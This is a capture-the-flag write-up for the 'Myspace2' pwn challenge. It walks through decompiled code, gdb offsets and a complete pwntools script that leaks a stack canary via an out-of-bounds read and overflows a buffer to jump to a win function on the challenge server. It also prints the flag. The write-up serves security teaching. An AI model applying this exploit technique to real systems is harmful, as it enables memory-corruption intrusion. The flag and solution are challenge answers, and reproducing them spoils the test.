---
description: a ret2win with canary bypass pwn challenge
---

# Myspace2

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

given an ELF file.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

we see here the ELF file has a stack canary. Then we run the program

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

then we decompile the program using ghidra

main:

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("I really miss MySpace. At least the part about ranking my friends. Let\'s recreate it!");
  local_78 = 0x6e316e337365;
  local_70 = 0x6f72655a;
  local_68 = 0x6e6f72746e6f43;
  local_60 = 0x317978696d;
  local_58 = 0x4c68736f4a;
  local_50 = 0x70707070616947;
  local_48 = 0x746e6f6673656349;
  local_40 = 0x78636974637261;
LAB_00401636:
  menu();
  fgets(local_38,0x28,stdin);
  iVar1 = FUN_00401160(local_38);
  if (iVar1 == 4) {
    if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  if (iVar1 < 5) {
    if (iVar1 == 3) {
      display_friend(&local_78);
      goto LAB_00401636;
    }
    if (iVar1 < 4) {
      if (iVar1 == 1) {
        all_friends(&local_78);
      }
      else {
        if (iVar1 != 2) goto LAB_004016cd;
        edit_friend(&local_78);
      }
      goto LAB_00401636;
    }
  }
LAB_004016cd:
  puts("Invalid option.");
  goto LAB_00401636;
}
```

this ELF has two vulnerabilities. one at edit\_friend and another at display\_friend.

```c
void edit_friend(long param_1)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nEnter index to edit (0-7): ");
  fgets(local_48,0x20,stdin);
  iVar1 = FUN_00401160(local_48);
  if ((iVar1 < 0) || (7 < iVar1)) {
    puts("Invalid index!");
  }
  else {
    puts("Enter new name: ");
    fgets((char *)((long)iVar1 * 8 + param_1),0x100,stdin);
    sVar2 = strcspn((char *)(param_1 + (long)iVar1 * 8),"\n");
    *(undefined *)((long)iVar1 * 8 + param_1 + sVar2) = 0;
    puts("Friend updated.");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```c
void display_friend(long param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nEnter index to display (0-7): ");
  fgets(local_28,0x10,stdin);
  iVar1 = FUN_00401160(local_28);
  if ((iVar1 < 0) || (7 < iVar1)) {
    puts("Invalid index!");
  }
  write(1,(void *)(param_1 + (long)iVar1 * 8),8);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

now for the exploit part. first we leak canary by exploiting arbitrary read vuln at display\_friend then we ret2win by exploiting buffer overflow vuln at edit\_friend.

we then use gdb to see the memory offsets

```armasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401584 <+0>:	endbr64
   0x0000000000401588 <+4>:	push   rbp
   0x0000000000401589 <+5>:	mov    rbp,rsp
   0x000000000040158c <+8>:	add    rsp,0xffffffffffffff80
   0x0000000000401590 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000401599 <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040159d <+25>:	xor    eax,eax
   0x000000000040159f <+27>:	mov    rax,QWORD PTR [rip+0x2aba]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x00000000004015a6 <+34>:	mov    ecx,0x0
   0x00000000004015ab <+39>:	mov    edx,0x2
   0x00000000004015b0 <+44>:	mov    esi,0x0
   0x00000000004015b5 <+49>:	mov    rdi,rax
   0x00000000004015b8 <+52>:	call   0x401150 <setvbuf@plt>
   0x00000000004015bd <+57>:	lea    rax,[rip+0xb24]        # 0x4020e8
   0x00000000004015c4 <+64>:	mov    rdi,rax
   0x00000000004015c7 <+67>:	call   0x4010d0 <puts@plt>
   0x00000000004015cc <+72>:	movabs rax,0x6e316e337365
   0x00000000004015d6 <+82>:	mov    QWORD PTR [rbp-0x70],rax
```

this might seem confusing, but when we combine with ghidra decompile info, we know that main <+82> is where 'friends' array started and it is stored in **rbp-0x70**. We can also see where the canary is located, which is main <+21> and is stored in **rbp-0x8**.

Now we can calculate the offsets:

*   friends to canary:

    Offset = (Canary addr) - (Friends beginning addr)

    Offset = (rbp-0x8) - (rbp-0x70)

    Offset = -0x8 + 0x70 = **0x68 bytes (104 in decimal)**&#x20;
*   Canary leak:

    *   Display\_friend() function reads address from **friends\_addr + index \* 8**.

        Canary\_addr = friends\_addr + index \* 8

        (friends\_addr) + 0x68 = (friends\_addr) + index \* 8

        0x68 = index \* 8

        index = 0x68/8 = 104/8 = **13**



now after we got all the offsets we construct our exploit:

```python
from pwn import *

#p = process('./myspace2')
p = remote('myspace2.chal.idek.team', 1337)

def leak(index):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'Enter index to display (0-7):', str(index).encode())
    p.recvuntil(b'Invalid index!\n')
    leaked = p.recv(8)
    return u64(leaked)

# Leak canary
canary = leak(13)
print(f"Canary: {hex(canary)}")

p.sendlineafter(b'>>', b'2')
p.sendlineafter(b'Enter index to edit (0-7):', b'0')

payload = b"A" * 104
payload += p64(canary)
payload += b"B" * 8
payload += p64(0x40129d)  # get_flag

p.sendlineafter(b'Enter new name:', payload)
p.sendlineafter(b'>>', b'4')
p.interactive()
```

#### Flag: idek{b4bys\_1st\_c00k1e\_leak\_yayyy!}
